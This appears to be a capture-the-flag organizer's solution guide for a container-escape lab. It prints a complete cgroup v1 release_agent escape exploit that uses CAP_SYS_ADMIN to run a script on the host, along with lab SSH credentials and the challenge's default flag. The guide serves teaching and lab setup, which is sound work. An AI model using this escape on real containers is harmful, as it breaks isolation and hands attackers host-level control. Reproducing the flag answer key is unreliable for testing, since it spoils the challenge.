# X07 — Container Escape Lab: Organizer Solution & Engineering Guide

## Challenge Overview
* **Challenge ID:** X07
* **Name:** Container Escape Lab
* **Category:** Linux / Containers / Namespaces / Runtime Isolation
* **Difficulty:** Expert / Bonus
* **External Interface:** TCP/22 (SSH)
* **Classification:** `SANDBOX_REQUIRED`

---

## 1. Intended Foothold & SSH Entry
Players connect to the vulnerable container workstation over SSH:
```bash
ssh -p 22 operator@<TARGET_HOST>
# Password: operator
```

---

## 2. Container Enumeration
Upon authentication, the player lands in an unprivileged shell (`uid=1000(operator)`) inside the container namespace.
Enumeration steps:
1. **Capabilities:** `sudo capsh --print` reveals `cap_sys_admin` is enabled.
2. **Mounts:** `cat /proc/mounts` and `cat /etc/mtab` reveal overlayfs structure and host upperdir paths.
3. **Cgroups:** `cat /proc/1/cgroup` reveals cgroup v1 controllers enabled.

---

## 3. Vulnerability Mechanism
The container is granted `CAP_SYS_ADMIN` without AppArmor restrictions in a dedicated VM environment. Under cgroup v1, `CAP_SYS_ADMIN` permits mounting the `cgroup` pseudo-filesystem, configuring a custom `release_agent` binary, and triggering host kernel execution when the cgroup becomes empty.

---

## 4. Exploit Walkthrough

```bash
# 1. Mount memory cgroup subsystem
sudo mkdir -p /tmp/cgrp && sudo mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. Create sub-cgroup and enable release notification
sudo mkdir -p /tmp/cgrp/x
echo 1 | sudo tee /tmp/cgrp/x/notify_on_release

# 3. Locate host container overlay mount directory
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 4. Construct payload script executed by host kernel
echo '#!/bin/sh' | sudo tee /cmd
echo 'cat /root/flag.txt > /tmp/host_flag.txt' | sudo tee -a /cmd
sudo chmod +x /cmd

# 5. Point release_agent to the script path on host
echo "$HOST_PATH/cmd" | sudo tee /tmp/cgrp/release_agent

# 6. Trigger release agent execution
sudo sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 7. Read host flag
cat /tmp/host_flag.txt
```

---

## 5. Host Flag & Verification
* **Location:** `/root/flag.txt` (on the sandbox VM host)
* **Default Flag:** `YUVA{c0nt41n3r_3sc4p3_cgr0up_c4ps_s4ndb0x_vm_x07}`
* **Flag Rule:** The flag must never be baked into container images or public distributions.

---

## 6. VM Isolation & Boundary Constraints
* **Dedicated VM:** Each team has a dedicated VM instance with 4 vCPUs, 4 GiB RAM, 20 GiB qcow2 disk.
* **Egress Filter:** Iptables blocks `169.254.169.254`, `10.96.0.0/12`, port 6443, port 10250, and RFC1918 neighbor subnets.
* **Reset Lifecycle:** Complete VM destruction on reset via `challenge/scripts/reset.sh`.
